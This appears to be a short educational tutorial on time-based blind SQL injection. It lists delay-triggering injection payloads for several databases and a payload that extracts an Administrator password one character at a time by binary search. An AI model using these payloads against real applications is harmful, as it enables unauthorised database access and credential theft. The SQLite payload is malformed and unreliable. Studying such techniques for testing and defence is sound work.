# ⏱️ Exploiting Blind SQL Injection by Triggering Time Delays

If an application handles errors perfectly, there won't be any difference in the application's response. In that situation, it is often possible to exploit the blind SQL injection vulnerability by using time delays.

The techniques for triggering a time delay are specifically dependent on what type of database is being used.

## SQL Server Example

On Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds because the condition `1=1` is true.

## Equivalent Commands for Other Databases

- **MySQL / MariaDB:** `'; SELECT SLEEP(10); --`
- **PostgreSQL:** `'; SELECT pg_sleep(10); --`
- **Oracle:** `'; BEGIN DBMS_LOCK.SLEEP(10); END; --` (Note: requires specific permissions)
- **SQLite:** `'; RANDOMBLOB(1000000000); --` (Heavier CPU load used to mimic a delay)

## Using Time Delays to Extract Data

You can use this logic to extract useful data. See this example where we try to guess the admin password one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Here, if the Administrator's password's first character is greater than 'm', then we get a delay response. Otherwise, everything is normal.

## Exploitation Process

1. **Confirm the injection** with a time delay
2. **Identify what data to extract** (e.g., password of admin user)
3. **Use binary search** to find each character efficiently
4. **Repeat** until the complete value is extracted

## Binary Search Example

Instead of checking `= 'a'`, `= 'b'`, `= 'c'`... (26 checks per character), use `>` comparisons:

- Is character > 'm'? (divides remaining characters in half)
- If yes, is character > 't'?
- Continue narrowing down the range

This significantly reduces the number of requests needed.
